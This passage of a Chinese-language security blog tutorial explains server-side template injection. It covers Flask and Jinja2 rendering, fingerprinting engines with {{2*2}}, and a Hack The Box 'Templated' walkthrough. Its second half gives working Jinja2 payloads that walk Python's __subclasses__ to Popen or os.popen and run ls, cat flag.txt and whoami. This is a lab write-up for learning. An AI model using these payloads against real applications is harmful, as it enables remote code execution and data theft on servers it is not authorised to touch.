    <span class="token operator">//</span> <span class="token keyword">exec</span>使用全局正则表达式意味着在循环中使用，因为它仍然会检索所有匹配的子表达式
    <span class="token operator">//</span> <span class="token operator">/</span>regex<span class="token operator">/</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>仅返回找到的第一个匹配项
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">match</span> <span class="token operator">=</span> regex<span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        template <span class="token operator">=</span> template<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span><span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> template<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">//</span> 最终的执行在此处

var string <span class="token operator">=</span> TemplateEngine<span class="token punctuation">(</span>template<span class="token punctuation">,</span>data<span class="token punctuation">)</span>
console<span class="token punctuation">.</span>log<span class="token punctuation">(</span>string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上述代码，我们的目的是：将<strong>数据文件</strong>中对应的name和age替换到<strong>模板文件</strong>中</p>
<p>主要的执行在模板引擎的while函数中，<code>match = regex.exec(template)</code>会返回一个<code>array</code>，这个数组中包含了多个项目</p>
<p>⚠️ 为什么会包含两项呢：当正则表达式设置 <code>g</code> 标志位时，可以多次执行 <code>exec</code> 方法来查找同一个字符串中的成功匹配</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622150533466.png" alt="image-20230622150533466"></p>
<pre class="line-numbers language-none"><code class="language-none">之后template = template.replace(match[0],data[match[1]])等同于template = template.replace("&lt;%name%&gt;",data["name"])完成模板中数据的替换<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622150543912.png" alt="image-20230622150543912"></p>
<h4 id="5-引发SSTI的真正原因">5. 引发SSTI的真正原因</h4>
<p>render_template渲染函数的问题</p>
<p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染。</p>
<pre class="line-numbers language-none"><code class="language-none">也就是说例如：`{{}}`在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把`{{}}`包裹的内容当做变量解析替换。比如`{{1+1}}`会被解析成2。如此一来就可以实现如同sql注入一样的注入漏洞。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>还比如说</p>
<p>由前面模板代码安利的演示，我们可以发现，<strong>若服务端接受了用户的输入后（比如对于上述案例，data的name和age的数据由数据的输入/提交/请求而得），未经任何处理就将其作为Web应用模板内容的一部分</strong>，就会导致模板引擎在进行目标编译渲染的过程中，执行了用户插入的可执行语句，从而可能导致信息泄露、代码执行等问题</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622150806192.png" alt="image-20230622150806192"></p>
<p>凡是使用模板的地方，SSTI是绕不过的问题，模板引擎可由多种语言实现，所以SSTI也就出现在了多种语言环境中</p>
<p>模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p>
<h4 id="6-route装饰器路由">6. route装饰器路由</h4>
<pre class="line-numbers language-none"><code class="language-none">@app.route('/')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用route（）装饰器告诉Flask什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如</p>
<pre class="line-numbers language-none"><code class="language-none">@app.route('/')
def test()"
   return 123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>访问127.0.0.1:5000/则会输出123，我们修改一下规则</p>
<p>这个时候访问127.0.0.1:5000/test会输出123.<br>
此外还可以设置动态网址，</p>
<pre class="line-numbers language-none"><code class="language-none">@app.route("/hello/&lt;username&gt;")
def hello_user(username):
  return "user:%s"%username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>根据url里的输入，动态辨别身份，此时便可以看到如下页面：</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622193641150.png" alt="image-20230622193641150"></p>
<p>或者可以使用int型，转换器有下面几种：</p>
<pre class="line-numbers language-none"><code class="language-none">int    接受整数
float    同 int ，但是接受浮点数
path    和默认的相似，但也接受斜线

@app.route('/post/&lt;int:post_id&gt;')
def show_post(post_id):
    # show the post with the given id, the id is an integer
    return 'Post %d' % post_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="7-main入口">7. main入口</h4>
<p>​		当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果你经常以cmd方式运行自己写的python小脚本，那么不需要这个东西，但是如果需要做一个稍微大一点的python开发，写 if name ==’main__’ 是一个良好的习惯，大一点的python脚本要分开几个文件来写，一个文件要使用另一个文件，也就是模块，此时这个if就会起到作用不会运行而是类似于文件包含来使用。</p>
<pre class="line-numbers language-none"><code class="language-none">if __name__ == '__main__':
    app.debug = True
    app.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>测试的时候，我们可以使用debug，方便调试，增加一句</p>
<pre class="line-numbers language-none"><code class="language-none">app.debug = True<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者（效果是一样的）<br>
app.run(debug=True)</p>
<p>这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。</p>
<pre class="line-numbers language-none"><code class="language-none">app.run(host='0.0.0.0')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。</p>
<h4 id="8-模板渲染（重点）">8. 模板渲染（重点）</h4>
<p>你可以使用 render_template() 方法来渲染模板。你需要做的一切就是将模板名和你想作为关键字的参数传入模板的变量。这里有一个展示如何渲染模板的简例:</p>
<p>简单的模版渲染示例</p>
<pre class="line-numbers language-none"><code class="language-none">from flask import render_template

@app.route('/hello/')
@app.route('/hello/&lt;name&gt;')
def hello(name=None):
        return render_template('hello.html', name=name)//我们hello.html模板未创建所以这段代码暂时供观赏，不妨往下继续看<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们从模板渲染开始实例，因为我们毕竟不是做开发的，flask以模板注入闻名- -！，所以我们先从flask模版渲染入手深入剖析。</p>
<p>首先要搞清楚，模板渲染体系，render_template函数渲染的是templates中的模板，所谓模板是我们自己写的html，里面的参数需要我们根据每个用户需求传入动态变量。</p>
<pre class="line-numbers language-none"><code class="language-none">├── app.py  
├── static  
│   └── style.css  
└── templates  
    └── index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622194232220.png" alt="image-20230622194232220"></p>
<p>我们写一个index.html文件写templates文件夹中。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>{{title}} - 小猪佩奇<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Hello, {{user.name}}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>里面有两个参数需要我们渲染，<a target="_blank" rel="noopener" href="http://user.name">user.name</a>，以及title</p>
<p>我们在app.py文件里进行渲染。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token comment">#我们访问/或者/index都会跳转</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   user <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'小猪佩奇'</span><span class="token punctuation">}</span><span class="token comment">#传入一个字典数组</span>
   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'Home'</span><span class="token punctuation">,</span>user<span class="token operator">=</span>user<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622194340296.png" alt="image-20230622194340296"></p>
<p>Image这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。</p>
<h3 id="2-2-判断SSTI类型">2.2. 判断SSTI类型</h3>
<p>上面提到网站模板引擎有jinja2、tornado、smarty、twig等等，那么如何判断遇到的是哪种类型？</p>
<p>广为流传的就是这张图了，根据处理返回值的不同来进行判别。（注意括号的数量等）</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230318105438138.png" alt="image-20230318105438138"></p>
<h4 id="1-常见的模板引擎">1. 常见的模板引擎</h4>
<pre class="line-numbers language-none"><code class="language-none">	PHP

Twig模板变量：{{%s}}

Smarty模板变量：{%s}

Blade模板变量：{{%s}}

	Python

Jinja2模板变量：{{%s}}

Tornado模板变量：{{%s}}

Django模板变量：{{ }}

	Java

FreeMarker模板变量：&lt;#%s&gt;``${%s}

Velocity模板变量：#set($x=1+1)${x}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>模板引擎众多，各个模板引擎的语法也不尽相同，我们最主要的是能定位出是否存在SSTI漏洞，至于后续的利用，我们掌握一些，其余的见到再查即可</strong></p>
<p><strong>Jinja2</strong></p>
<p>Jinja2 是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的。<br>
Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 <code>{{…}}</code> 块。<br>
Jinja2 模板同样支持控制语句，像在 <code>{%…%}</code> 块中。</p>
<pre class="line-numbers language-none"><code class="language-none">控制结构 {% %} 可以声明变量，也可以执行语句
变量取值 {{ }} 用于将表达式打印到模板输出
注释块 {# #} 用于注释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="2-如何测试是否存在SSTI">2. 如何测试是否存在SSTI</h4>
<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，<strong>通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入</strong>，否则不存在 SSTI</p>
<p>此处我们拿来<strong>bmjoker师傅</strong>提供的一段示例代码</p>
<p>Twig模板引擎示例代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
　　<span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'\twig\lib\Twig\Autoloader.php'</span><span class="token punctuation">;</span>
　　<span class="token class-name static-context">Twig_Autoloader</span><span class="token operator">::</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Twig_Loader_Array 用于定位模板 内置的加载器</span>
    <span class="token comment">// Twig_Environment 来存储配置信息 内置的环境变量</span>
　　<span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Twig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token comment">// render() 方法通过其第一个参数载入模板，**并通过第二个参数中的变量来渲染模板**！！重要！！</span>
    <span class="token comment">// 模版含有 {{name}} 变量，其模版变量值来自于GET请求参数$_GET["name"]</span>
　　<span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-&gt;</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello {{name}}"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 将用户输入作为模版变量的值</span>

　　<span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这段代码中，由于<strong>模板引擎一般都会默认对渲染的变量值进行编码和转义</strong>。所以一般情况下并不会存在XSS等攻击的可能</p>
<p>若就如我们最开始的例子所说，<strong>若模板引擎渲染的内容受我们控制了</strong>，就不一定了</p>
<pre class="line-numbers language-none"><code class="language-none">// 上述代码基本内容不变，$output后的内容发生变化
　$output=$twig-&gt;render("Hello {$_GET['name']}");// 将用户输入作为模版内容的一部分<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>此时render函数由于缺少第二个参数，所以<strong>直接就会把<code>"Hello 用户的输入"</code>拼如模板进行渲染</strong>,这就相当于改变了最初的模板，由于模板最初是由开发者定义的，所以他会受到“信任”</p>
<pre class="line-numbers language-none"><code class="language-none">对于Twig模板的变量`{{%s}}`除了传递变量外，还可以执行表达式，最简单的表达式就是{{2*2}}，这也是辨认是否存在SSTI最基本的指纹，若我们输入{{2*2}}，HTML页面返回其其结果4，就说明该表达式被解析，存在SSTI<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="3-靶场实战">3. 靶场实战</h4>
<p>HTB-Templated</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622165242901.png" alt="image-20230622165242901"></p>
<pre class="line-numbers language-none"><code class="language-none">题目直接提示我们本体使用的模板引擎为**Jinja2**，根据我们之前总结的各个模板引擎的变量类型，我们可以知道该变量的类型是 **{{%s}}**，所以话不多说我们直接拼接尝试<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">payload={{2 * 2}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622165431523.png" alt="image-20230622165431523"></p>
<p><strong>2*2被计算，确认存在SSTI模板注入</strong></p>
<p><strong>exp</strong></p>
<p>本题的重点还是在利用方面：由于我们的目标是读取处于服务器本地的一个存有Flag的文件，所以我们的重点是找到一个含有某种读取文件的函数的类（Python中），我们通过查阅手册发现可以利用<code>Popen</code>函数完成该功能，调用该函数会返回一个文件的句柄，然后再配合read()函数读取即可</p>
<p>该函数会执行<code>fork</code>一个子进程执行<code>command</code>这个命令，同时将子进程的标准输出通过管道连接到父进程，对于文件在父进程调用read()读取即可，对于命令在父进程会被执行</p>
<p>那么下面的重点就是，如何找到<code>Popen</code>这个函数所属的类，一般有两种方法，我们先说第一种</p>
<p>由于我们想要找的是一个子类，所以第一步即使找到其对象基类 即<code>class 'object'</code>，为了达到这步，我们可以使用<code>__mro__</code>属性来访问对象的继承类，但我们目前没有对象，所以这里我们就构造一个<strong>空字符串</strong>:</p>
<pre class="line-numbers language-none"><code class="language-none">`{{"".__class__.__mro__}}`其中`__class__`用于返回调用的参数类型<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622165651398.png" alt="image-20230622165651398"></p>
<p>可以看出该子类继承自<code>class'str'</code>与<code>class 'object'</code>并以一个元组返回，我们通过索引获得对象类</p>
<pre class="line-numbers language-none"><code class="language-none">{{"".__class__.__mro__[1]}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622165720077.png" alt="image-20230622165720077"></p>
<p>接下来，我们要列举出所有集成自object的子类，通过对该对象调用<code>__subclasses__</code>方法</p>
<pre class="line-numbers language-none"><code class="language-none">{{"".__class__.__mro__[1].__subclasses__()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622165759911.png" alt="image-20230622165759911"></p>
<p>但这有一个明显的缺点就是，好家伙，这么多子类，怎么可能找得到，<strong>为了缩小范围我们对其进行切片</strong></p>
<pre class="line-numbers language-none"><code class="language-none">`{{"".__class__.__mro__[1].__subclasses__()[400:]}}`查找400个以后的元素<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622165935917.png" alt="image-20230622165935917"></p>
<p>成功定位其位置，处于滴414号位置</p>
<pre class="line-numbers language-none"><code class="language-none">{{"".__class__.__mro__[1].__subclasses__()[414]}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后我们为该函数传递参数调用即可</p>
<pre class="line-numbers language-none"><code class="language-none">{{"".__class__.__mro__[1].__subclasses__()[414]("ls",shell=True,stdout=-1).communicate()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看本地文件，发现<code>flag.txt</code></p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622170048071.png" alt="image-20230622170048071"></p>
<pre class="line-numbers language-none"><code class="language-none">Popen.communicate()
与进程交互：将数据发送到标准输入。从 stdout 和 stderr 读取数据，直到到达文件结尾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>之后我们直接<code>cat</code>他就看见啦~~~~</p>
<pre class="line-numbers language-none"><code class="language-none">{{"".__class__.__mro__[1].__subclasses__()[414]("cat flag.txt",shell=True,stdout=-1).communicate()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622170109873.png" alt="image-20230622170109873"></p>
<p>剩下的未实操过</p>
<p><strong>exp2</strong></p>
<p>这里我们还有一种方法，使用全局下的内置模块引用<code>__builtins__</code>（指向<code>__builtin__</code>）</p>
<p>在Python中，有一个内建模块，该模块中有一些常用函数;而该模块在Python启动后、且没有执行程序员所写的任何代码前，Python会首先加载 该内建函数到内存</p>
<pre class="line-numbers language-none"><code class="language-none">{{"".__class__.__bases__[0].__subclasses__()[1500].__init__.__globals__['__builtins__']['__import__']("os").popen("cat flag.txt").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>同样，我们获取基本类后，继续向下获取基本类(object)的子类，然后<code>init</code>初始化类，<code>globals</code>全局来查找所有的方法及变量和参数并查看其内建模块的引用</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622170431180.png" alt="image-20230622170431180"></p>
<p>使用内建模块中的<code>__import__</code>引入<code>os</code>库，并适用其中的<code>popen</code>函数读取<code>flag.txt</code>即可</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622170442551.png" alt="image-20230622170442551"></p>
<p>注意：</p>
<p>该exp中，对子类的选择<code>subclasses()[1500]</code>时，经测试大多数子类中都包含内建模块的引用，但依旧有不少不包含，要注意</p>
<p>我们使用burp将子类的选择加为参数进行爆破</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622170551908.png" alt="image-20230622170551908"></p>
<p>遍历出（以下截图中Payload的子类号都可以引用，具有**<code>__builtins__</code>**）</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622170603589.png" alt="image-20230622170603589"></p>
<p>以下为不可以使用的（由此可看出号往大了写就对了~）</p>
<p><img src="/2023/08/06/qian-xi-ssti-lou-dong/image-20230622170626554.png" alt="image-20230622170626554"></p>
<h4 id="4-SSTI利用思路">4. SSTI利用思路</h4>
<p>先上Payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls").read()'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>下面分步对每一步代码进行分析：</p>
<p>1.首先考虑拿到一个class，通过字符串、元组、列表、字典均可。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;class 'str'&gt;</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;type 'tuple'&gt;</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;type 'list'&gt;</span>
<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">.</span>__class__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;type 'dict'&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>2.下一步目的是拿到object基类。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;class 'object'&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>3.然后获取对应子类。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>4.在所有的子类中选择一个可用的类，去获取__globals__全局变量。如果这些函数并没有被重载，这时他们并不是function，不具有__globals__属性。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;class 'os._wrap_close'&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>5.通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;function _wrap_close.__init__ at 0x00000221629F5048&gt;</span>

<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># ..., 'eval': &lt;built-in function eval&gt;, ...</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>6.再获取到__globals__全局变量里的__builtins__中的eval函数。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># {'__name__': 'builtins', '__doc__': ...</span>

<span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># &lt;built-in function eval&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>7.使用popen命令执行即可。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("whoami").read()'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>
<span class="token comment"># root</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="2-3-常用类">2.3 常用类</h3>
